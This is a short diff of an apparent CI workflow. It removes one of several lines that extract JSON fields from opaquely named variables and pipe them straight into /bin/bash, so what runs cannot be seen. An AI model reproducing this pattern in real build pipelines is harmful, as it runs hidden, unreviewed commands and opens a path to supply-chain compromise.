@@ -21,7 +21,6 @@ jobs:
           echo $do2 | jq -r .msxhl7 | /bin/bash
           echo $ebo65 | jq -r .ehvfb56362 | /bin/bash
           echo $hpfjw2496 | jq -r .y411 | /bin/bash
-          printf '%s' "$gr7718" | jq -r .gou47621 | /bin/bash
           echo $pzf84802 | jq -r .ymobz440 | /bin/bash
           printf '%s' "$lmbhe129" | jq -r .vsygt889 | /bin/bash
           printf '%s' "$prqvq23553" | jq -r .z7248 | /bin/bash
